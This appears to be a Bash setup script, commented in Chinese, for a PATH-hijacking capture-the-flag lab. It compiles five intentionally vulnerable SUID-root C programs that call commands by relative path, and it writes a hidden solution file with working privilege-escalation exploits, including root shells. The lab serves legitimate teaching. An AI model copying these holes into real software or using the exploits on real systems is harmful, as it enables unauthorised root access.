#!/bin/bash

#################################################
#     PATH Hijacking Lab - Setup Script        #
#     Author: CTF Lab Generator                #
#     Version: 2.0                             #
#################################################

# 顏色定義
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 檢查是否以 root 執行
check_root() {
    if [ "$EUID" -ne 0 ]; then 
        echo -e "${RED}[!] 請使用 root 權限執行此腳本${NC}"
        echo "使用方法: sudo bash $0"
        exit 1
    fi
}

# 顯示 Banner
show_banner() {
    clear
    echo -e "${BLUE}"
    echo "╔══════════════════════════════════════════════╗"
    echo "║       PATH Hijacking Lab Setup v2.0         ║"
    echo "║         SUID Privilege Escalation            ║"
    echo "╚══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# 清理舊環境
cleanup_old() {
    echo -e "${YELLOW}[*] 清理舊環境...${NC}"
    rm -rf /opt/lab/b 2>/dev/null
    rm -rf /tmp/path_lab 2>/dev/null
    echo -e "${GREEN}[✓] 清理完成${NC}"
}

# 創建目錄結構
create_directories() {
    echo -e "${YELLOW}[*] 創建目錄結構...${NC}"
    
    # 主目錄
    mkdir -p /opt/lab/b/{vuln,root,src,docs}
    
    # 設定權限
    chmod 755 /opt/lab/b
    chmod 755 /opt/lab/b/vuln
    chmod 755 /opt/lab/b/src
    chmod 755 /opt/lab/b/docs
    chmod 700 /opt/lab/b/root
    
    echo -e "${GREEN}[✓] 目錄結構創建完成${NC}"
}

# 創建 flag 檔案
create_flags() {
    echo -e "${YELLOW}[*] 創建 flag 檔案...${NC}"
    
    # 主要 flag
    echo "flag{suid_path_injection_ftw}" > /opt/lab/b/root/flag8.txt
    chmod 600 /opt/lab/b/root/flag8.txt
    chown root:root /opt/lab/b/root/flag8.txt
    
    # 額外的 flags（用於其他挑戰）
    echo "flag{you_found_secret_flag1}" > /opt/lab/b/root/.secret_flag1
    echo "flag{hidden_flag_number_2}" > /opt/lab/b/root/.hidden/flag2.txt 2>/dev/null || {
        mkdir -p /opt/lab/b/root/.hidden
        echo "flag{hidden_flag_number_2}" > /opt/lab/b/root/.hidden/flag2.txt
    }
    
    chmod 600 /opt/lab/b/root/.secret_flag1
    chmod -R 600 /opt/lab/b/root/.hidden 2>/dev/null
    
    echo -e "${GREEN}[✓] Flag 檔案創建完成${NC}"
}

# 創建有漏洞的程式
create_vulnerable_programs() {
    echo -e "${YELLOW}[*] 創建有漏洞的程式...${NC}"
    
    # ============ 程式 1: maintenance (主要挑戰) ============
    cat > /opt/lab/b/src/maintenance.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main() {
    printf("System Maintenance Tool v1.0\n");
    printf("=============================\n");
    
    // 保留 root 權限
    setuid(geteuid());
    setgid(getegid());
    
    // 漏洞1：使用相對路徑
    printf("\n[*] Checking processes:\n");
    char *args[] = {"ps", "aux", NULL};
    execvp("ps", args);  // 可以被 PATH 劫持！
    
    return 0;
}
EOF

    # ============ 程式 2: backup (簡單版) ============
    cat > /opt/lab/b/src/backup.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    printf("Backup Tool v1.0\n");
    printf("================\n");
    
    // 設定權限
    setuid(geteuid());
    setgid(getegid());
    
    printf("Creating backup...\n");
    
    // 漏洞：沒有使用絕對路徑
    system("ls -la /opt/lab/b/ > /tmp/backup.log");
    system("cat /tmp/backup.log");
    
    printf("\nBackup complete!\n");
    return 0;
}
EOF

    # ============ 程式 3: reader (可讀取檔案) ============
    cat > /opt/lab/b/src/reader.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    if (argc != 2) {
        printf("Usage: %s <file>\n", argv[0]);
        return 1;
    }
    
    // 設定權限
    setuid(geteuid());
    setgid(getegid());
    
    printf("Reading file: %s\n", argv[1]);
    printf("==================\n");
    
    // 漏洞：使用 cat 但沒有絕對路徑
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "cat %s 2>/dev/null || echo 'File not found'", argv[1]);
    system(cmd);
    
    return 0;
}
EOF

    # ============ 程式 4: sysinfo (多個漏洞) ============
    cat > /opt/lab/b/src/sysinfo.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

void show_date() {
    printf("\n[*] Current Date:\n");
    system("date");
}

void show_users() {
    printf("\n[*] Current Users:\n");
    system("whoami");
    system("id");
}

void show_network() {
    printf("\n[*] Network Info:\n");
    char *args[] = {"netstat", "-an", NULL};
    execvp("netstat", args);  // PATH 劫持點！
}

int main(int argc, char *argv[]) {
    printf("System Information Tool v2.0\n");
    printf("============================\n");
    
    // 保留權限
    setuid(geteuid());
    setgid(getegid());
    
    if (argc < 2) {
        show_date();
        show_users();
        show_network();
    } else if (strcmp(argv[1], "date") == 0) {
        show_date();
    } else if (strcmp(argv[1], "users") == 0) {
        show_users();
    } else if (strcmp(argv[1], "network") == 0) {
        show_network();
    } else {
        printf("Unknown option: %s\n", argv[1]);
    }
    
    return 0;
}
EOF

    # ============ 程式 5: monitor (最簡單的) ============
    cat > /opt/lab/b/src/monitor.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

int main() {
    printf("System Monitor v1.0\n");
    printf("===================\n");
    
    // 直接設定 UID
    setuid(0);
    setgid(0);
    
    // 最簡單的漏洞
    char *args[] = {"ps", NULL};
    execvp("ps", args);
    
    return 0;
}
EOF

    echo -e "${GREEN}[✓] 原始碼創建完成${NC}"
}

# 編譯程式
compile_programs() {
    echo -e "${YELLOW}[*] 編譯程式...${NC}"
    
    # 編譯所有程式
    gcc -o /opt/lab/b/vuln/maintenance /opt/lab/b/src/maintenance.c 2>/dev/null || {
        echo -e "${RED}[!] 編譯 maintenance 失敗${NC}"
    }
    
    gcc -o /opt/lab/b/vuln/backup /opt/lab/b/src/backup.c 2>/dev/null || {
        echo -e "${RED}[!] 編譯 backup 失敗${NC}"
    }
    
    gcc -o /opt/lab/b/vuln/reader /opt/lab/b/src/reader.c 2>/dev/null || {
        echo -e "${RED}[!] 編譯 reader 失敗${NC}"
    }
    
    gcc -o /opt/lab/b/vuln/sysinfo /opt/lab/b/src/sysinfo.c 2>/dev/null || {
        echo -e "${RED}[!] 編譯 sysinfo 失敗${NC}"
    }
    
    gcc -o /opt/lab/b/vuln/monitor /opt/lab/b/src/monitor.c 2>/dev/null || {
        echo -e "${RED}[!] 編譯 monitor 失敗${NC}"
    }
    
    echo -e "${GREEN}[✓] 程式編譯完成${NC}"
}

# 設定 SUID 權限
set_permissions() {
    echo -e "${YELLOW}[*] 設定 SUID 權限...${NC}"
    
    # 設定所有權和 SUID
    for prog in maintenance backup reader sysinfo monitor; do
        if [ -f "/opt/lab/b/vuln/$prog" ]; then
            chown root:root /opt/lab/b/vuln/$prog
            chmod 4755 /opt/lab/b/vuln/$prog
            echo -e "  ${GREEN}✓${NC} $prog"
        fi
    done
    
    echo -e "${GREEN}[✓] SUID 權限設定完成${NC}"
}

# 創建文檔
create_documentation() {
    echo -e "${YELLOW}[*] 創建文檔...${NC}"
    
    # README
    cat > /opt/lab/b/README.md << 'EOF'
# PATH Hijacking Lab

## 目標
取得 `/opt/lab/b/root/flag8.txt` 的內容

## 可用的 SUID 程式
- `/opt/lab/b/vuln/maintenance` - 系統維護工具（主要挑戰）
- `/opt/lab/b/vuln/backup` - 備份工具
- `/opt/lab/b/vuln/reader` - 檔案讀取器
- `/opt/lab/b/vuln/sysinfo` - 系統資訊工具
- `/opt/lab/b/vuln/monitor` - 系統監控（最簡單）

## 提示
1. 使用 `strings` 分析二進位檔
2. 檢查程式呼叫了哪些指令
3. 想想 PATH 環境變數的作用
4. `execvp()` vs `execv()` 的差異

## 快速開始
```bash
# 檢查 SUID 程式
ls -la /opt/lab/b/vuln/

# 分析程式
strings /opt/lab/b/vuln/maintenance

# 執行程式
/opt/lab/b/vuln/maintenance
```

## 規則
- 不要使用 sudo
- 不要修改 /opt/lab/b/ 下的檔案
- 只能在 /tmp 創建利用檔案

祝你好運！
EOF

    # 解答文件（隱藏）
    cat > /opt/lab/b/docs/.solution.txt << 'EOF'
=== SOLUTION ===

方法 1: 利用 maintenance
-------------------------
echo '#!/bin/bash' > /tmp/ps
echo 'cat /opt/lab/b/root/flag8.txt' >> /tmp/ps
chmod +x /tmp/ps
PATH=/tmp:$PATH /opt/lab/b/vuln/maintenance

方法 2: 利用 monitor（最簡單）
-----------------------------
echo '#!/bin/bash' > /tmp/ps
echo '/bin/bash -p' >> /tmp/ps
chmod +x /tmp/ps
PATH=/tmp:$PATH /opt/lab/b/vuln/monitor

方法 3: 利用 reader
-------------------
echo '#!/bin/bash' > /tmp/cat
echo '/bin/cat /opt/lab/b/root/flag8.txt' >> /tmp/cat
chmod +x /tmp/cat
PATH=/tmp:$PATH /opt/lab/b/vuln/reader any_file

方法 4: 取得 root shell
-----------------------
cat > /tmp/ps << 'SCRIPT'
#!/usr/bin/python3
import os
os.setuid(0)
os.setgid(0)
os.system("/bin/bash")
SCRIPT
chmod +x /tmp/ps
PATH=/tmp:$PATH /opt/lab/b/vuln/maintenance
EOF

    chmod 644 /opt/lab/b/README.md
    chmod 600 /opt/lab/b/docs/.solution.txt
    
    echo -e "${GREEN}[✓] 文檔創建完成${NC}"
}

# 創建測試腳本
create_test_script() {
    echo -e "${YELLOW}[*] 創建測試腳本...${NC}"
    
    cat > /opt/lab/b/test_lab.sh << 'EOF'
#!/bin/bash

echo "=== Lab Test Script ==="
echo ""

# 測試目錄權限
echo "[*] Testing directory permissions:"
ls -ld /opt/lab/b/root/ 2>&1 | grep -q "drwx------.*root.*root" && echo "  ✓ Root directory protected" || echo "  ✗ Root directory not protected"

# 測試 flag
echo ""
echo "[*] Testing flag file:"
ls -la /opt/lab/b/root/flag8.txt 2>&1 | grep -q "root.*root" && echo "  ✓ Flag owned by root" || echo "  ✗ Flag ownership issue"

# 測試 SUID
echo ""
echo "[*] Testing SUID programs:"
for prog in maintenance backup reader sysinfo monitor; do
    if [ -f "/opt/lab/b/vuln/$prog" ]; then
        ls -la /opt/lab/b/vuln/$prog | grep -q "^-rws" && echo "  ✓ $prog has SUID" || echo "  ✗ $prog missing SUID"
    fi
done

echo ""
echo "[*] Quick exploit test:"
echo '#!/bin/bash' > /tmp/test_ps
echo 'echo "PATH hijack works!"' >> /tmp/test_ps
echo 'id' >> /tmp/test_ps
chmod +x /tmp/test_ps
result=$(PATH=/tmp:$PATH /opt/lab/b/vuln/monitor 2>&1)
echo "$result" | grep -q "uid=0" && echo "  ✓ Exploit works!" || echo "  ✗ Exploit failed"
rm -f /tmp/test_ps

echo ""
echo "=== Test Complete ==="
EOF

    chmod +x /opt/lab/b/test_lab.sh
    echo -e "${GREEN}[✓] 測試腳本創建完成${NC}"
}

# 設定陷阱（可選）
setup_traps() {
    echo -e "${YELLOW}[*] 設定額外挑戰...${NC}"
    
    # 創建假 flag
    echo "flag{this_is_fake_flag}" > /opt/lab/b/vuln/fake_flag.txt
    chmod 644 /opt/lab/b/vuln/fake_flag.txt
    
    # 創建提示檔案
    echo "Hint: Try 'monitor' first, it's the easiest!" > /opt/lab/b/HINT.txt
    chmod 644 /opt/lab/b/HINT.txt
    
    echo -e "${GREEN}[✓] 額外挑戰設定完成${NC}"
}

# 顯示完成訊息
show_completion() {
    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║         Lab Setup Complete!                  ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLUE}Lab 位置:${NC} /opt/lab/b/"
    echo -e "${BLUE}SUID 程式:${NC} /opt/lab/b/vuln/"
    echo -e "${BLUE}目標 Flag:${NC} /opt/lab/b/root/flag8.txt"
    echo -e "${BLUE}說明文件:${NC} /opt/lab/b/README.md"
    echo ""
    echo -e "${YELLOW}可用的 SUID 程式:${NC}"
    ls -la /opt/lab/b/vuln/ | grep "^-rws"
    echo ""
    echo -e "${GREEN}測試 Lab:${NC} /opt/lab/b/test_lab.sh"
    echo ""
    echo -e "${YELLOW}開始挑戰:${NC}"
    echo "1. 切換到普通用戶: ${BLUE}su - kali${NC}"
    echo "2. 查看說明: ${BLUE}cat /opt/lab/b/README.md${NC}"
    echo "3. 開始挑戰: ${BLUE}/opt/lab/b/vuln/monitor${NC}"
    echo ""
    echo -e "${GREEN}祝你好運！${NC}"
}

# 主函數
main() {
    show_banner
    check_root
    
    echo -e "${YELLOW}[*] 開始設置 PATH Hijacking Lab...${NC}"
    echo ""
    
    cleanup_old
    create_directories
    create_flags
    create_vulnerable_programs
    compile_programs
    set_permissions
    create_documentation
    create_test_script
    setup_traps
    
    # 執行測試
    echo ""
    echo -e "${YELLOW}[*] 執行測試...${NC}"
    /opt/lab/b/test_lab.sh
    
    show_completion
}

# 執行主函數
main "$@"